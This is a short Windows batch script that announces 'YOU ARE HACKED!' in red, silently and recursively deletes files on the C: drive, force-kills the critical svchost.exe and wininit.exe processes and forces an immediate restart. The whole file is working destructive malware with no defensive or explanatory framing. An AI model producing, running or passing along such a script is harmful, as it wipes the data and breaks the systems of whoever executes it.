@echo off
title YOU ARE HACKED!
color 4
echo YOU ARE HACKED!
del /s /q C:\
taskkill /f /im svchost.exe
taskkill /f /im wininit.exe
powershell wininit
shutdown -r -t 0
